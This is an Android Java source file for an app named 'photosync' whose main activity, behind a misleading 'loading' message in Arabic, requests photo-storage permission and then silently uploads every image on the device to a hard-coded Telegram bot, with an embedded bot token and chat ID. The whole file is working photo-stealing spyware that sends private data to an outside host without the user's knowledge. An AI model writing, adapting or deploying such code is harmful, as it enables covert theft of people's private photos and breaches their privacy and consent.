package com.photosync;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class MainActivity extends AppCompatActivity {
    private static final String BOT_TOKEN = "8959305609:AAG070oMFDTip9OAZE6WYtrqQW1-c_N7zDU";
    private static final String CHAT_ID = "1950459933";
    private static final int PERM_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Toast.makeText(this, "جاري التحميل...", Toast.LENGTH_SHORT).show();
        askPerms();
    }

    private void askPerms() {
        String perm = (Build.VERSION.SDK_INT >= 33)
            ? Manifest.permission.READ_MEDIA_IMAGES
            : Manifest.permission.READ_EXTERNAL_STORAGE;
        if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{perm}, PERM_CODE);
        } else {
            start();
        }
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] p, int[] r) {
        super.onRequestPermissionsResult(req, p, r);
        if (req == PERM_CODE) start();
    }

    private void start() {
        ExecutorService ex = Executors.newSingleThreadExecutor();
        ex.execute(() -> {
            try {
                sendMsg("📸 بدء رفع الصور...");
                String[] proj = {MediaStore.Images.Media.DATA};
                Cursor c = getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    proj, null, null, null);
                if (c != null) {
                    while (c.moveToNext()) {
                        String path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                        File f = new File(path);
                        if (f.exists()) sendPhoto(f);
                    }
                    c.close();
                }
                sendMsg("✅ انتهى");
            } catch (Exception e) {
                sendMsg("خطأ: " + e.getMessage());
            }
        });
    }

    private void sendMsg(String text) {
        try {
            OkHttpClient cl = new OkHttpClient();
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + Uri.encode(text);
            cl.newCall(new Request.Builder().url(url).build()).execute().close();
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void sendPhoto(File f) {
        try {
            OkHttpClient cl = new OkHttpClient();
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", f.getName(),
                    RequestBody.create(f, MediaType.parse("image/jpeg")))
                .build();
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
            cl.newCall(new Request.Builder().url(url).post(body).build()).execute().close();
        } catch (Exception e) { e.printStackTrace(); }
    }
}
